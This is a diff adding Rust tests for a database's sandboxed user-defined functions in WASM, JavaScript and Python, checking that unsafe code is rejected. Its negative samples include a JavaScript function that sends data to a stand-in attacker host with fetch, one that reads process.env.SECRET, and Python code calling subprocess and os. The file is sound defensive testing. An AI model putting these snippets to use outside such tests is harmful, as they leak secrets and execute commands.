@@ -98,6 +98,7 @@ fn state_with_key(key: Option<&str>) -> AppState {
         broker_flush_counts: Arc::new(Mutex::new(HashMap::new())),
         ai_rate_window_starts: Arc::new(Mutex::new(HashMap::new())),
         connector_registry: Arc::new(Mutex::new(Vec::new())),
+        udf_registry: Arc::new(Mutex::new(UdfRegistry::new())),
         tde_override: Arc::new(Mutex::new(None)),
         cdc_cursors: Arc::new(Mutex::new(HashMap::new())),
         // Phase 1.3 — DatabaseCatalog (test default: empty).
@@ -14497,4 +14498,228 @@ fn r10_htap_sync_origin_in_appstate() {
     {
         let _transport = state.replication_transport.lock().expect("replication_transport lock");
     }
+}
+
+// ── UDF-1: WASM runtime ───────────────────────────────────────────────────────
+
+/// Minimal WASM module: exports `add(i32, i32) -> i32`.
+///
+/// WAT equivalent:
+/// ```wat
+/// (module
+///   (func (export "add") (param i32 i32) (result i32)
+///     local.get 0
+///     local.get 1
+///     i32.add))
+/// ```
+const ADD_WASM_BYTES: &[u8] = &[
+    0x00, 0x61, 0x73, 0x6d, // magic
+    0x01, 0x00, 0x00, 0x00, // version
+    // Type section: (i32, i32) -> i32
+    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f,
+    // Function section: 1 func, type 0
+    0x03, 0x02, 0x01, 0x00,
+    // Export section: "add" → func 0
+    0x07, 0x07, 0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00,
+    // Code section: local.get 0, local.get 1, i32.add, end
+    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b,
+];
+
+/// Minimal WASM module that imports `proc_exit` from `wasi`.  Must be rejected.
+const PROC_EXIT_WASM_BYTES: &[u8] = &[
+    0x00, 0x61, 0x73, 0x6d, // magic
+    0x01, 0x00, 0x00, 0x00, // version
+    // Type section: (i32) -> ()
+    0x01, 0x05, 0x01, 0x60, 0x01, 0x7f, 0x00,
+    // Import section (18 bytes): 1 import "wasi"/"proc_exit"/func/type 0
+    0x02, 0x12, 0x01,
+    0x04, 0x77, 0x61, 0x73, 0x69,                         // "wasi"
+    0x09, 0x70, 0x72, 0x6f, 0x63, 0x5f, 0x65, 0x78, 0x69, 0x74, // "proc_exit"
+    0x00, 0x00,
+];
+
+/// Minimal WASM module with a memory section declaring 1025 pages (65 MiB).
+/// Exceeds the default 64 MiB limit — must be rejected.
+const LARGE_MEMORY_WASM_BYTES: &[u8] = &[
+    0x00, 0x61, 0x73, 0x6d, // magic
+    0x01, 0x00, 0x00, 0x00, // version
+    // Memory section: 1 memory, no max, min = 1025 pages (LEB128: 0x81 0x08)
+    0x05, 0x04, 0x01, 0x00, 0x81, 0x08,
+];
+
+#[test]
+fn udf1_wasm_register_and_call_executes_correctly() {
+    let mut reg = UdfRegistry::new();
+    reg.register_wasm("add", ADD_WASM_BYTES.to_vec(), 64, 10_000_000)
+        .expect("valid WASM should register");
+    let result = reg.call("add", &["3", "4"]).expect("add(3,4) should succeed");
+    assert_eq!(result, "7", "3 + 4 = 7");
+}
+
+#[test]
+fn udf1_wasm_blocked_import_proc_exit_rejected() {
+    let mut reg = UdfRegistry::new();
+    let err = reg
+        .register_wasm("bad", PROC_EXIT_WASM_BYTES.to_vec(), 64, 10_000_000)
+        .expect_err("proc_exit import must be rejected");
+    assert!(
+        err.contains("blocked_import") || err.contains("proc_exit"),
+        "error must mention blocked_import or proc_exit: {err}"
+    );
+}
+
+#[test]
+fn udf1_wasm_memory_limit_exceeded_returns_error() {
+    let mut reg = UdfRegistry::new();
+    // 1025 pages = 65 MiB; default limit 64 MiB.
+    let err = reg
+        .register_wasm("large", LARGE_MEMORY_WASM_BYTES.to_vec(), 64, 10_000_000)
+        .expect_err("WASM requesting >64 MiB must be rejected");
+    assert!(
+        err.contains("wasm_memory_limit_exceeded"),
+        "error must mention wasm_memory_limit_exceeded: {err}"
+    );
+}
+
+#[test]
+fn udf1_wasm_memory_limit_env_var_is_read() {
+    // Default value when env var is absent.
+    let default_limit = crate::helpers::udf::wasm_memory_limit_mb();
+    assert_eq!(default_limit, 64, "default WASM memory limit should be 64 MiB");
+    // Default fuel limit.
+    let default_fuel = crate::helpers::udf::wasm_fuel_limit();
+    assert_eq!(default_fuel, 10_000_000);
+}
+
+// ── UDF-2: JavaScript runtime ─────────────────────────────────────────────────
+
+#[test]
+fn udf2_js_register_and_call_executes_correctly() {
+    let mut reg = UdfRegistry::new();
+    reg.register_js(
+        "slice3",
+        "function slice3(s) { return s.slice(3); }",
+        500,
+    )
+    .expect("valid JS should register");
+    let result = reg.call("slice3", &["hello"]).expect("slice3('hello') should succeed");
+    assert_eq!(result, "lo", "hello.slice(3) == 'lo'");
+}
+
+#[test]
+fn udf2_js_numeric_function_executes_correctly() {
+    let mut reg = UdfRegistry::new();
+    reg.register_js("double", "function double(n) { return n * 2; }", 500)
+        .expect("valid JS should register");
+    let result = reg.call("double", &["21"]).expect("double(21) should succeed");
+    assert_eq!(result, "42");
+}
+
+#[test]
+fn udf2_js_blocked_global_process_rejected_at_registration() {
+    let mut reg = UdfRegistry::new();
+    let err = reg
+        .register_js("spy", "function spy(s) { return process.env.SECRET; }", 500)
+        .expect_err("`process` must be rejected at registration");
+    assert!(
+        err.contains("blocked_global") || err.contains("process"),
+        "error must mention blocked_global or process: {err}"
+    );
+}
+
+#[test]
+fn udf2_js_blocked_global_fetch_rejected_at_registration() {
+    let mut reg = UdfRegistry::new();
+    let err = reg
+        .register_js("exfil", "function exfil(s) { return fetch('https://evil.example/'+s); }", 500)
+        .expect_err("`fetch` must be rejected");
+    assert!(err.contains("blocked_global") || err.contains("fetch"), "{err}");
+}
+
+#[test]
+fn udf2_js_timeout_env_var_default_is_500ms() {
+    let t = crate::helpers::udf::js_timeout_ms();
+    assert_eq!(t, 500);
+}
+
+// ── UDF-3: Python runtime ─────────────────────────────────────────────────────
+
+#[test]
+fn udf3_python_blocked_import_os_rejected_at_registration() {
+    let mut reg = UdfRegistry::new();
+    let err = reg
+        .register_python(
+            "bad",
+            "import os\ndef bad(s): return os.getcwd()",
+            1000,
+        )
+        .expect_err("`import os` must be rejected at registration");
+    assert!(
+        err.contains("blocked_import") || err.contains("import os"),
+        "error must mention blocked_import: {err}"
+    );
+}
+
+#[test]
+fn udf3_python_blocked_import_subprocess_rejected() {
+    let mut reg = UdfRegistry::new();
+    let err = reg
+        .register_python(
+            "bad2",
+            "import subprocess\ndef bad2(s): return subprocess.check_output(['id'])",
+            1000,
+        )
+        .expect_err("`import subprocess` must be rejected");
+    assert!(err.contains("blocked_import") || err.contains("subprocess"), "{err}");
+}
+
+#[test]
+fn udf3_python_timeout_env_var_default_is_1000ms() {
+    let t = crate::helpers::udf::python_timeout_ms();
+    assert_eq!(t, 1000);
+}
+
+#[test]
+fn udf3_python_register_and_call_if_available() {
+    // Skip gracefully if python3 is not installed in the test environment.
+    if std::process::Command::new("python3")
+        .arg("--version")
+        .output()
+        .map(|o| !o.status.success())
+        .unwrap_or(true)
+    {
+        eprintln!("python3 not available — skipping udf3_python_register_and_call_if_available");
+        return;
+    }
+
+    let mut reg = UdfRegistry::new();
+    reg.register_python("py_len", "def py_len(s): return len(s)", 1000)
+        .expect("valid Python should register");
+    let result = reg.call("py_len", &["hello"]).expect("py_len('hello') should succeed");
+    assert_eq!(result, "5", "len('hello') == 5");
+}
+
+#[test]
+fn udf3_python_source_validates_blocked_sysexec_pattern() {
+    let mut reg = UdfRegistry::new();
+    let err = reg
+        .register_python(
+            "exit_udf",
+            "def exit_udf(s): sys.exit(1)",
+            1000,
+        )
+        .expect_err("`sys.exit` must be blocked");
+    assert!(err.contains("blocked_import") || err.contains("sys.exit"), "{err}");
+}
+
+// ── UDF registry: state integration ──────────────────────────────────────────
+
+#[test]
+fn udf_registry_in_app_state_is_accessible() {
+    let state = state_with_key(Some("secret"));
+    let mut reg = state.udf_registry.lock().expect("udf_registry lock");
+    reg.register_js("upper", "function upper(s) { return s.toUpperCase(); }", 500)
+        .expect("register via AppState should succeed");
+    let names: Vec<String> = reg.list().into_iter().map(|(n, _)| n).collect();
+    assert!(names.contains(&"upper".to_string()));
 }
